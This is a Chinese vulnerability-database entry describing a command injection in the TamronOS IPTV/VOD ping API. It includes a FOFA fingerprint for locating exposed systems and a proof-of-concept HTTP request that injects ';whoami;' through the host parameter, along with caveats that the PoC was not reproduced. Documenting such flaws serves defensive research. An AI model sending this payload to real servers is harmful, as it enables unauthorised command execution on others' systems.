---
source: "wy876 漏洞文库"
title: "TamronOS IPTV/VOD api ping host命令注入"
product: "TamronOS IPTV/VOD"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；Linux shell拼接假设"
prerequisites: "请求无Cookie，鉴权未证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zy6y35t0g2nad6dw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/TamronOS/TamronOSIPTV%E7%B3%BB%E7%BB%9Fping%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"TamronOS-IPTV系统\""
id: "vw-368152cb8983228128909c7d"
entity_id: "ve-368152cb8983228128909c7d"
schema_version: "1"
---

# TamronOS IPTV/VOD api ping host命令注入

## 条目说明

- 对象与具体问题：TamronOS IPTV/VOD；api ping host命令注入
- 版本、配置及部署条件：版本未知；Linux shell拼接假设
- 认证与权限前提：请求无Cookie，鉴权未证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有whoami请求，无响应、源码和修复；不能据请求确认服务器权限
- count/host查询参数用于POST应保持原样核证，Host空
- 缺CVE/CNVD或厂商公告，不与其他ping接口产品混合

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
TamronOS IPTV/VOD系统是一套基于Linux内核开发的宽带运营商、酒店、学校直播点播一体解决方案。系统提供了多种客户端（Android机顶盒、电视、PC版点播、手机版点播）方便用户通过不同的设备接入。TamronOS IPTV系统ping存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ TamronOS IPTV系统

## 三、资产测绘
+ fofa`app="TamronOS-IPTV系统"`
+ 特征


## 四、漏洞复现
```http
POST /api/ping?count=5&host=;whoami; HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 0
Connection: close

```

> 请求长度说明：原资料 Content-Length 为 0；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zy6y35t0g2nad6dw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
